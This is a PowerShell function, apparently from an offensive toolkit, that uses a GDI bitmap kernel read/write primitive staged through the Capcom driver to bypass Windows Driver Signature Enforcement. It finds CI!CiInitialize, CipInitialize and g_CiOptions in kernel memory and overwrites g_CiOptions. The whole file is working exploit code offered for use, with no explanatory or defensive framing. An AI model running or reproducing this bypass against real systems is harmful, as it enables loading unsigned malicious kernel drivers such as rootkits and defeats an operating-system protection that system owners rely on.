function Capcom-DriverSigning {
	param ([Int]$SetValue)

	# DSE bypass only supported on Win8+
	if ($OSMajMin -le 6.2) {
		Write-Output "[!] Driver signature enforcement bypass not supported on this OS!`n"
		Return
	}

	# Check our bitmaps have been staged into memory
	if (!$ManagerBitmap -Or !$WorkerBitmap) {
		Capcom-StageGDI
		if ($DriverNotLoaded -eq $true) {
			Return
		}
	}

	# Leak CI base => $SystemModuleCI.ImageBase
	$SystemModuleCI = Get-LoadedModules |Where-Object {$_.ImageName -Like "*CI.dll"}

	# We need DONT_RESOLVE_DLL_REFERENCES for CI LoadLibraryEx
	$CIHanle = [Capcom]::LoadLibraryEx("ci.dll", [IntPtr]::Zero, 0x1)
	$CiInitialize = [Capcom]::GetProcAddress($CIHanle, "CiInitialize")

	# Calculate => CI!CiInitialize
	$CiInitializePtr = $CiInitialize.ToInt64() - $CIHanle + $SystemModuleCI.ImageBase
	Write-Output "`n[+] CI!CiInitialize: $('{0:X}' -f $CiInitializePtr)"

	# Free CI handle
	$CallResult = [Capcom]::FreeLibrary($CIHanle)
	
	# Calculate => CipInitialize
	# jmp CI!CipInitialize
	for ($i=0;$i -lt 500;$i++) {
		$val = ("{0:X}" -f $(Bitmap-Read -Address $($CiInitializePtr + $i))) -split '(..)' | ? { $_ }
		# Look for the first jmp instruction
		if ($val[-1] -eq "E9") {
			$Distance = [Int]"0x$(($val[-3,-2]) -join '')"
			$CipInitialize = $Distance + 5 + $CiInitializePtr + $i
			Write-Output "[+] CI!CipInitialize: $('{0:X}' -f $CipInitialize)"
			break
		}
	}

	# Calculate => g_CiOptions
	# mov dword ptr [CI!g_CiOptions],ecx
	for ($i=0;$i -lt 500;$i++) {
		$val = ("{0:X}" -f $(Bitmap-Read -Address $($CipInitialize + $i))) -split '(..)' | ? { $_ }
		# Look for the first jmp instruction
		if ($val[-1] -eq "89" -And $val[-2] -eq "0D") {
			$Distance = [Int]"0x$(($val[-6..-3]) -join '')"
			$g_CiOptions = $Distance + 6 + $CipInitialize + $i
			Write-Output "[+] CI!g_CiOptions: $('{0:X}' -f $g_CiOptions)"
			break
		}
	}

	# print g_CiOptions
	Write-Output "[+] Current CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"

	if ($SetValue) {
		Bitmap-Write -Address $g_CiOptions -Value $SetValue
		# print new g_CiOptions
		Write-Output "[!] New CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"
	}
}